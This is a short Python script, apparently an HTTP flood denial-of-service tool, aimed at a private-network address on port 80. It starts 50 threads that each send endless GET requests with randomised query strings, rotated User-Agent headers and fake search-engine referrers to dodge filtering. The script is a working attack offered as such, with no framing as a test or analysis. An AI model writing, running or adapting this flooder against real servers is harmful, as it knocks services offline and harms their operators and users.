import threading
import random
import urllib.parse
import http.client

host = "192.168.75.133"
port = 80
path = "/"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

referrers = [
    "http://www.google.com/?q=",
    "http://www.bing.com/search?q=",
    "http://search.yahoo.com/search?p="
]

def send_attack():
    while True:
        conn = http.client.HTTPConnection(host, port)
        url = f"{path}?{random.randint(1, 100000)}"
        headers = {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice(referrers) + str(random.randint(1000,9999)),
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        try:
            conn.request("GET", url, headers=headers)
            response = conn.getresponse()
            print(f"Sent --> {url} | Status: {response.status}")
            conn.close()
        except Exception as e:
            print(f"Error: {e}")
            conn.close()


for i in range(50):  
    thread = threading.Thread(target=send_attack)
    thread.daemon = True
    thread.start()

input("Press Enter to stop...\n")
